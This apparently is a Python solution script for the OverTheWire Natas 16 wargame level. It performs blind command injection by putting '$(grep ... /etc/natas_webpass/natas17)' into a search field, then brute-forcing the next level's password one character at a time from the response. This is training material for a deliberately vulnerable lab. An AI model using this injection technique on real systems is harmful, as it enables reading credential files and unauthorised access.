import requests
import string
import sys

valid_chars = string.digits + string.ascii_letters
auth_pass = sys.argv[1]
password = ""
i = 0
while len(password) < 32:
    for ch in valid_chars:
        payload = {'needle':f"$(grep ^{password}{ch} /etc/natas_webpass/natas17)victory",
                   "submit":"Search"}
        response = requests.post(
            'http://natas16.natas.labs.overthewire.org/index.php', 
            auth=('natas16', auth_pass),
            params=payload
        )
        # if password == '0OC':
        #     print(response.text)
        # print(response.text)
        if 'victory' not in response.text:
            password += ch
            print(f"Found: {ch}, password is - {password}")
            break
        # exit(0)

print(f"Finish! the password is {password}")
